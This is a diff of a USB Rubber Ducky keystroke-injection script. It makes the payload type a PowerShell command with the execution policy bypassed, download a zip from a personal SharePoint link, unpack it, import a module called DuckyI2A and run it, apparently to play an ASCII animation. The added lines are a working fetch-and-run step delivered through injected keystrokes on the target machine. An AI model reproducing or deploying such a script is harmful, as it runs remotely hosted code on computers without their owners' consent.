@@ -18,11 +18,9 @@ DELAY 200
 STRING powershell -Exec Bypass -NonI
 ENTER 
 DELAY 300
-STRING $uP = Get-WMIObject Win32_Volume | ?{ $_.Label -eq 'DUCKY' } | select name; cd $uP.name;
-STRING Import-Module .\DuckyI2A; is2a ./Frames -FitConsoleHeight -Resolution High
+STRING $uP = Invoke-WebRequest -Uri "https://jalcollege-my.sharepoint.com/:u:/g/personal/dcaldwell0590_volmail_jalc_edu/EeUZmZdi1zNLmoNzmRou6N4B_hCgu8YyOBeq9PTSSSoIdQ?e=K5xUdW&download=1" -OutFile ".\Frames.zip";
+STRING Expand-Archive .\Frames.zip -DestinationPath . -Force;
+STRING Import-Module .\DuckyI2A; is2a .\Frames -FitConsoleHeight -Resolution High
 ENTER
 DELAY 300
 ENTER
-
-REM STRING do set myd=%d &
-REM STRING powershell Import-Module %myd%\DuckyI2A; is2a .\Frames -FitConsoleHeight -Resolution High"
